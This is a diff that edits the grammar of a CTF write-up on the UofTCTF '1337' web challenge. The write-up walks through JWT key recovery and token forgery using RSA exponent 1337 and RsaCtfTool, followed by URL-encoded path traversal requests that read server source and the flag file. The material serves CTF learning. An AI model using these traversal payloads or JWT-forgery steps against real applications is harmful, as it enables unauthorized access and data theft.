@@ -34,30 +34,28 @@ Visit the website here
 Author: SteakEnthusiast
 ```
 
-Surprisingly this challenge only had 13 solves and I was the second person to solve this challenge. Crazy.
+Surprisingly, this challenge only had 13 solves, and I was the second person to solve it. Crazy.
 
 
 #### Introduction
 
-
-In this challenge we are given this login form (with only username) and the goal is to login as the admin user. 
+In this challenge, we are given a login form (with only a username field), and the goal is to log in as the admin user.
 
 ![UI of the challenge page](https://i.imgur.com/zIGeWeI.png)
 
-
-If you login as any username other than `4dm1n` this is what you saw:
+If you log in as any username other than `4dm1n`, you see:
 
 ![](https://i.imgur.com/5itetfM.png)
 > You see a message that says "W3lc0m3 `<username>`! Y0u 4r3 n0t 4n 4dm1n."
 
+When you try to log in as `4dm1n`, it tells you "Acc355 D3n13d".
 
-When you try to login as `4dm1n` it will tell you "Acc355 D3n13d".
 
 #### Semi-unsuccessful steps
 
-At first I thoung that maybee this is an injection challenge. I tried various types of injection like SQL injection, NoSQL injection, SSTI injection, etc. However, non of them worked. 
+At first, I thought that maybe this was an injection challenge. I tried various types of injection like SQL injection, NoSQL injection, SSTI injection, etc. However, none of them worked.
 
-Next thing that I tried was instead of sending string, I though about what would happen if I sent an array. 
+Next, instead of sending a string, I thought about what would happen if I sent an array.
 
 ```
 POST /login HTTP/1.1
@@ -76,23 +74,23 @@ username[]=4dm1n
 This was the result:
 ![](https://i.imgur.com/FK5XNVb.png)
 
-Looking at the error message saying `TypeError: username.toLowerCase is not a function` and seeing the new JavaScript file `/usr/src/app/5up3r_53cur3_50urc3_c0d3.js` I though about what would happen if I used mixed cases, so `4dm1n` would become `4dM1N`. Sadly, that also gave an "Acc355 D3n13d" error. 
+Looking at the error message saying `TypeError: username.toLowerCase is not a function` and seeing the new JavaScript file `/usr/src/app/5up3r_53cur3_50urc3_c0d3.js`, I thought about what would happen if I used mixed case, so `4dm1n` would become `4dM1N`. Sadly, that also gave an "Acc355 D3n13d" error.
 
-I also tied to see may be various encoding might help bypass the filter, but all attempt failed.
+I also tried to see if maybe various encodings might help bypass the filter, but all attempts failed.
 
-> I also tried some path traversal stuff, because `/usr/src/app/5up3r_53cur3_50urc3_c0d3.js` path in the error message made it pretty clear that the attacker wanted us to leak the content of this file.
+> I also tried some path traversal stuff, because `/usr/src/app/5up3r_53cur3_50urc3_c0d3.js` in the error message made it pretty clear that the attacker wanted us to leak the content of this file (CTF logic smh).
 
-
-I also went to robots.txt file, and I found this
+I went to the robots.txt file, and I found this:
 ```
 User-agent: *
 Disallow: /1337_v4u17
 ```
 > I needed to be admin to access the `/1337_v4u17` page
 
+
 #### Solution
 
-My attention slowly started focusing on the JWT token that was being used to "prove" authentication. 
+My attention slowly started focusing on the JWT token that was being used to “prove” authentication.
 ```
 HTTP/1.1 200 OK
 X-Powered-By: Express
@@ -102,15 +100,15 @@ Set-Cookie: token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiL
 When I decoded it using https://jwt.io/, this is what I saw:
 ![](https://i.imgur.com/FKUokft.png)
 
-> I noticed that they were using RS256 algorithm for the JWT. This stood out to me, because by default JWT algorithm is not set to `RS256`, you would have to deliberately attempt to set that action.
+> I noticed that they were using the RS256 algorithm for the JWT. This stood out to me because, by default, the JWT algorithm is not set to `RS256`. You have to explicitly set that.
 
-I went on to the PayloadAllThings GitHub repo https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token which I know listed some of the attack method against JWT token.
+I went to the PayloadAllThings GitHub repo: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token, which I know lists some attack methods against JWT tokens.
 
-So, I methodically read all of the attacks against JWT and tried each one of them (if it made sense to use that method ofc). 
+So I methodically read all the attacks against JWT and tried each one that made sense. 
 
-I noticed that before, implementing one of the attack (Key Confusion Attack RS256 to HS256), I needed to recover JWT public key from Signed JWT. So that's what I did. 
+I noticed that before implementing one of the attacks (the Key Confusion Attack RS256 to HS256), I needed to recover the JWT public key from the Signed JWT. So that's what I did. 
 
-However, it did not work for some reason, at this time. I was bit tired, so I did not bother looking too much into it, instead focused on other challenges (the CTF had just started). But later on I read this https://pentestkit.co.uk/jwt/recover_key.html and was able to use this tool https://github.com/FlorianPicca/JWT-Key-Recovery.git with `e = 1337` to recover the public key.
+However, it did not work for some reason at first. I was a bit tired, so I did not bother looking too deeply into it and instead focused on other challenges (the CTF had just started). But later on, I read this: https://pentestkit.co.uk/jwt/recover_key.html and was able to use this tool: https://github.com/FlorianPicca/JWT-Key-Recovery.git with `e = 1337` to recover the public key.
 
 ```bash
 git clone https://github.com/FlorianPicca/JWT-Key-Recovery.git
@@ -119,7 +117,7 @@ python3 ./recover.py JWT_1 JWT_2 -e 1337
 ```
 > Modified code snippet from https://pentestkit.co.uk/jwt/recover_key.html
 
-In this case, JWT_1 and JWT_2 were the JWT token for two different username. And `-e 1337` was the RSA public exponent used (default is 65537). I think most people were stuck with changing the RSA public exponent to `1337`. I kind of guesses it was that because of the challenge description and title mentioned `1337`.
+In this case, JWT_1 and JWT_2 were the JWT tokens for two different usernames, and `-e 1337` was the RSA public exponent used (the default is 65537). I think most people got stuck on changing the RSA public exponent to `1337`. I kind of guessed it was that because the challenge description and title mentioned `1337`.
 
 I was able to recover the public key:
 ```
@@ -134,8 +132,7 @@ rwICBTk=
 -----END PUBLIC KEY-----
 ```
 
-I was not able to the RSA key confusion attack, so after searching around for few hours, I attempted to see if I could retrieve private key.
-
+I was not able to perform the RSA key confusion attack, so after searching around for a few hours, I attempted to see if I could retrieve the private key.
 
 I was able to generate the private key via this tool:
 https://github.com/RsaCtfTool/RsaCtfTool/tree/master
@@ -157,25 +154,22 @@ eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRkbTFuIiwiaWF0IjoxNzM2NjA
 ```
 > You can also use https://jwt.io/
 
-I though I would be done with the challenge after visiting `/1337_v4u17`, but I was wrong, the challenge was not over...
+I thought I would be done with the challenge after visiting `/1337_v4u17`, but I was wrong; the challenge was not over...
 
-
-I now was able to access a page where the "admin" kept their jornal.
+I was now able to access a page where the "admin" kept their journal.
 ![](https://i.imgur.com/B7LZYcn.png)
 
-
-When I clicked on the journal I was sent to this page: `GET /1337_v4u17?file=vault%2Fjournal1.txt HTTP/1.1`.
+When I clicked on the journal, I was sent to this page: `GET /1337_v4u17?file=vault%2Fjournal1.txt HTTP/1.1`.
 
 This felt like a case of path traversal, so that's what I tried.
 
-
-I was able to retired that path from before via path traversal (`file=vault/../../../../../../usr/src/app/5up3r_53cur3_50urc3_c0d3.js`)
+I was able to retrieve that path from before via path traversal (`file=vault/../../../../../../usr/src/app/5up3r_53cur3_50urc3_c0d3.js`):
 ```
 GET /1337_v4u17?file=%76%61%75%6c%74%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%75%73%72%2f%73%72%63%2f%61%70%70%2f%35%75%70%33%72%5f%35%33%63%75%72%33%5f%35%30%75%72%63%33%5f%63%30%64%33%2e%6a%73 HTTP/1.1
 ```
-> It looks like a mess because I used Burp's Decoder tool to encode path traversal input into URL encoded.
+> It looks like a mess because I used Burp's Decoder tool to encode the path traversal input into URL-encoded format.
 
-This is what I found (redacted for convenience):
+This is what I found (shortened for convenience):
 ```js
 ...
 const bodyParser = require('body-parser');
@@ -186,16 +180,16 @@ const PORT = process.env.PORT || 1337;
 ...
 ```
 
-I know that I wanted to know what was in `require('secret-flag')` to I started by searching for `secret-flag.js`, but nothing could be found.
+I knew I wanted to see what was in `require('secret-flag')`, so I started by searching for `secret-flag.js`, but nothing could be found.
 
-Then, I tied `/node_modules/secret-flag/index.js` which I thought would be the next step on where I could find the flag, and I was correct. 
+Then I tried `/node_modules/secret-flag/index.js`, which I thought would be the next step to finding the flag, and I was correct.
 
 `file=vault/../../../../../../usr/src/app/node_modules/secret-flag/index.js`
 ```
 GET /1337_v4u17?file=%76%61%75%6c%74%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%75%73%72%2f%73%72%63%2f%61%70%70%2f%6e%6f%64%65%5f%6d%6f%64%75%6c%65%73%2f%73%65%63%72%65%74%2d%66%6c%61%67%2f%69%6e%64%65%78%2e%6a%73 HTTP/1.1
 ```
 
-I found the flag
+I found the flag:
 ```js
 const SECRET_FLAG = "uoftctf{l337_15_p3rf3c7_f0r_fl465_4nd_3xp0n3n75}";
 module.exports = SECRET_FLAG;
